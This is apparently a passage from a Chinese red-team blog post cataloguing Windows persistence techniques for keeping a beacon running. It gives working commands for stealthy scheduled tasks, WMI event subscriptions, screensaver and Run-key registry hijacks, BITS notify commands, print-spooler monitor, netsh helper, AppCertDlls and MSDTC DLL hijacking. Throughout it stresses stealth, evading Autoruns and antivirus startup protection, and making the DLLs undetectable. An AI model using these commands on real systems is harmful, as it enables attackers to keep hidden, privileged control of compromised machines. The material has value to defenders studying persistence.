                     /RU runasuser /RP
        ==> 创建计划任务 "gaming"，每天从 12:00 点开始到
            14:00 点自动结束，运行 freecell.exe。
            SCHTASKS /Create /SC DAILY /TN gaming /TR c:\freecell /ST 12:00
                     /ET 14:00 /K
        ==> 创建计划任务“EventLog”以开始运行 wevtvwr.msc
            只要在“系统”通道中发布事件 101
            SCHTASKS /Create /TN EventLog /TR wevtvwr.msc /SC ONEVENT
                     /EC System /MO *[System/EventID=101]
        ==> 文件路径中可以加入空格，但需要加上两组引号，
            一组引号用于 CMD.EXE，另一组用于 SchTasks.exe。用于 CMD
            的外部引号必须是一对双引号；内部引号可以是一对单引号或
            一对转义双引号:
            SCHTASKS /Create
               /tr "'c:\program files\internet explorer\iexplorer.exe'
               \"c:\log data\today.xml\"" ...
“计划任务程序库”中也是有路径的，Windows初始状态在根目录中是没有计划任务的，如下图：
当然子目录中也是没有计划任务的：
计划任务都被放在了最内层目录里面，因此为了确保隐蔽性，我们也可以遵守Windows默认的规范在“\Microsoft\Windows\”下面新建我们的子目录和计划任务。示例命令如下：  
`SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN
\Microsoft\Windows\evil\eviltask /TR C:\Users\hunter\Desktop\evil.exe`  
无需登录即可收到beacon：
在进程树中，恶意进程是被taskeng.exe即任务计划程序引擎拉起的，隐蔽性弱于DLL服务，但强于自启注册键。  
但是，大坑又来了，我们发现SCHTASKS命令功能并不完整，很多配置项是无法操作的，比如不支持同时创建多个触发器，不支持修改“条件”和“设置”选项卡中的功能。如下：
这些选项都是任务创建时的默认状态，也就是说我们的计划任务不会在睡眠唤醒时启动，断开交流电源自动停止，超过3天自动停止。而这些高级选项却不支持用命令行配置，查了一下微软社区，官方给的回复竟然是这样的：
哭笑不得...对于正常用户使用起来确实没问题，但对于红队来说，我们不方便操作GUI啊！当然也可以通过制作DLL模块或exe直接调用WINAPI来操作，但那还需要额外再上传一个文件，效率稍低。因此计划任务这个持久化的路子只能作为一个保险，并不能完全依赖。  
此外还有一个有些相似的利用点——组策略。在启动脚本处可以执行cmd脚本或ps脚本从而执行任意命令，但由于命令行版本的组策略编辑器功能太过受限，就不再做展开（如果可以登录桌面的话直接去gpedit.msc去配置启动脚本即可持久化，且隐蔽性较高）。
## 0x05 WMI
权限要求：未降权的管理员权限。  
我们可以认为WMI是一组可以直接与Windows操作系统交互的API，由于这是操作系统自带的工具，无需安装，因此也是权限维持的好帮手。  
由于WMI的事件会循环执行，为确保不会无限弹shell，可以使用系统启动时间来限制（只要触发延时可以落在限定区间即可，有些机器启动慢因此起始时间调高些）。示例命令如下：
    wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="evil", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 310"
    wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="evilConsumer", ExecutablePath="C:\Users\hunter\Desktop\beacon.exe",CommandLineTemplate="C:\Users\hunter\Desktop\beacon.exe"
    wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"evil\"", Consumer="CommandLineEventConsumer.Name=\"evilConsumer\""
由于时间区间的落点不一定相同，特定情况下有可能会出现多个beacon：
看下进程树，隐蔽性一般：
## 0x06 屏幕保护
权限要求：普通用户。  
虽然未必所有用户都会使用屏幕保护，但幸运的是屏幕保护程序的相关配置都在注册表中，如下图的四个键：
完整路径如下：
    HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive
    HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure
    HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut
    HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE
直接写入注册表即可：
    reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d C:\Users\hunter\Desktop\beacon.exe /f
    reg add "hkcu\control panel\desktop" /v ScreenSaveActive /d 1 /f
    reg add "hkcu\control panel\desktop" /v ScreenSaverIsSecure /d 0 /f
    reg add "hkcu\control panel\desktop" /v ScreenSaveTimeOut /d 60 /f
看一下进程树，winlogon.exe拉起来的，隐蔽性一般：
这里又有个小坑，如果从未设置过屏保程序的话，除“ScreenSaveActive”默认值为1，其他键都是不存在的，而屏保程序的正常运行必须保证这几个键都有数据才可以，因此必须把4个键都重写一遍。另外，经测试屏保程序最短触发时间为60秒，即使改成小于60的数值，依然还是60秒后执行程序。  
当然，从注册表路径也可以看出这种方式只能获得当前用户权限的shell，优点是不需要提权即可维持。
## 0x07 后台智能传输服务（BITS）
权限要求：管理员权限（不必过UAC）。  
后台智能传送服务 (BITS)
可帮助传输大量数据而不会降低网络性能。它通过在小区块中传输数据、充分利用可用的但未使用的带宽和在目的地重组数据的方式来实现此操作。在 Microsoft®
Windows Server 2003 家族操作系统上和 Microsoft® Windows 2000 上都支持 BITS。——摘自百度百科  
网上的“渗透教程”中有很多利用bitsadmin命令下载文件或执行命令的操作，但它其实也可以用来做权限维持，并且可以绕过Autoruns的检测以及杀软的自启命令执行保护。  
添加任务的命令很简单，只有4条：
    bitsadmin /create evil
    bitsadmin /addfile evil "C:\Users\hunter\Desktop\beacon.exe" "C:\Users\hunter\Desktop\beacon.exe"
    bitsadmin.exe /SetNotifyCmdLine evil "C:\Users\hunter\Desktop\beacon.exe" NUL
    bitsadmin /Resume evil
其有个优点是可以在降权的管理员回话中执行（不过UAC），当然得到的beacon也是降权的：
重启后由于任务并未结束，依然会被系统拉起，达到了持久化的目的。虽然后台智能传输服务的任务默认时长是90天，90天后任务自动取消，但对于红队来说这已经足够了：
看一下进程树，是“svchost.exe -k netsvcs"拉起的。但由于是独立进程，隐蔽性一般：
这种方法可以绕过目前所有启动项检查工具，唯一检测方式是通过bistamin命令：  
`bitsadmin /list /allusers /verbose`  
可以看到所有任务如下（忘记截图，这是另一台测试机，数据不同）：
## 0x07 后台打印程序服务
权限要求：未降权的管理员权限。  
后台打印程序服务负责管理Windows操作系统中的打印作业，由于很多用户还是要使用打印机的，所以优化软件也不会推荐禁用这个服务。打印后台处理程序的API包含一个函数-AddMonitor，用于安装本地端口监视器并连接配置、数据和监视器文件。该函数会将DLL注入到spoolsv.exe进程以实现相应功能。系统初始状态下需要调用的DLL如下：
这些DLL都是包含与打印服务驱动相关的内容，那么我们也可以利用这个机制驻留一个恶意DLL，当然，和注册服务一样，这必须要未降权的管理员权限。  
首先将恶意DLL放到C:\Windows\System32\路径下：
然后执行命令添加相关注册表项和Driver键：  
`reg add "hklm\system\currentcontrolset\control\print\monitors\monitor" /v
"Driver" /d "monitor.dll" /t REG_SZ`
重新启动后，恶意DLL则会被自动加载到spoolsv.exe，隐蔽性较强：
控制端以SYSTEM权限上线（这里演示暂时用的MSF，CS的DLL还要自己重写一个）：
## 0x08 Netsh
权限要求：未降权的管理员权限。  
netsh也是Windows自带的命令，是用来配置网络的命令行工具。该工具可以通过导入helperdll的方式实现功能，且DLL导入后会写进注册表，永久有效：
因此可以通过导入helperdll的方式做权限维持，命令格式如下：  
`netsh add helper [Absolute evil DLL path]`  
但是由于netsh并不会开启自启动，因此还要再写一条自启动项：  
`reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v
Pentestlab /t REG_SZ /d "cmd /c C:\Windows\System32\netsh"`  
重新启动后依然可获得shell：
进程树和加载的恶意模块如下，隐蔽性较强：
但由于测试过程依然使用的是msf生成的DLL，启动netsh的时候会弹出黑框并阻塞，关掉netsh进程后连接也就断掉了，因此后续实战应用还需要自己写DLL。
## 0x09 AppCertDlls
权限要求：未降权的管理员权限。  
众所周知注册表项“AppInit_DLLs”中的值会在user32.dll被加载到内存的时候被读取，若其中有值则调用API“LoadLibrary()”加载用户DLL。  
早些年用这个做DLL注入式持久化比较流行，但如今在很多新系统上却失效了。其原因是由于kernel32.dll在启动时有一个标记位的判断，如下图：
kernel32.dll对0x67的Class进行NtQuerySystemInformation后，检查ReturnLength与2的运算是否为0（是否相等），若相等则不加载DLL直接ret。  
关于0x67在网上可以查到相关资料：
它是由bcdedit.exe的“–set testsigning on/off”参数设置的，但现在比较新的机器一般都在BIOS中默认设置了secure
boot，如果不关掉这个选项是无法修改上面的标记的。因此，这个方法目前局限性就比较大了。  
然而其实还有一个注册表项不太常用，并且也能够自动加载DLL，那就是AppCertDlls。当进程使用了CreateProcess、CreateProcessAsUser、CreateProcessWithLoginW、CreateProcessWithTokenW、WinExec这些API的时候，该项中的内容会被自动加载，而幸运的，是很多程序都会调用这些API。  
写一个测试程序调用上面的API：
执行：
msf上线：
看下进程树：
只是在正常进程下面开了个rundll32.exe，将恶意DLL加载，隐蔽性较高。  
但使用msf的DLL依然只能做测试，由于系统的很多程序都会调用以上API（比如explorer.exe），而msf的DLL会导致进程阻塞，最终导致启动的时候进不去桌面，因此DLL还要之后自己写。
## 0x0A MSDTC
权限要求：未降权的管理员权限。  
msdtc.exe是微软分布式传输协调bai程序。该du进程调用系统Microsoft Personal Web Server和Microsoft SQL
Server。该服务用于管理多个服务器。  
该服务启动后会尝试从System32加载三个DLL文件：oci.dll、SQLLib80.dll、xa80.dll。服务项如下：
对应注册表如下：
在默认的Windows安装中，System32文件夹中缺少oci.dll这个文件，在获得写权限的情况下可以在该文件夹下写入一个同名的dll，服务启动时执行恶意代码。  
默认情况下，由于启动类型设置为“手动”，通过以下命令设置自启：
    sc qc msdtc
    sc config msdtc start= auto
恶意dll会被加载到msdtc.exe进程中执行，隐蔽性强：
## 0x0B 总结
一开始整理持久化技术的时候总共列了20种左右，但实践中发现很多持久化技术并是不通用的，例如针对特定场景，特定配置，特定应用的权限维持；甚至还有些是“被动”持久化，例如快捷方式的替换，排除利用快捷方式漏洞利用这条路，如果目标不去点是不会触发的。因此将那些局限性较大的持久化技术删掉以精简篇幅（减少工作量），最后将持久化技术精简到了以上10种，相对来说比较通用。  
整理的过程中也发现一个Ring3中无奈的点：用户层的持久化如果想做到隐蔽性强且绕过杀软的行为检测，一定要借助Windows自带的功能（白利用），如果这些功能或模块在特殊环境中被关闭、卸载或无法正常启动就会很尴尬。因此多准备几种方法总还是很有用的。  
由于时间关系，部分需要单独制作的DLL使用了msf直接生成的DLL进行测试，但免杀效果堪忧。后续制作CS插件的时候还需要再完成这些DLL并对其做一些免杀处理。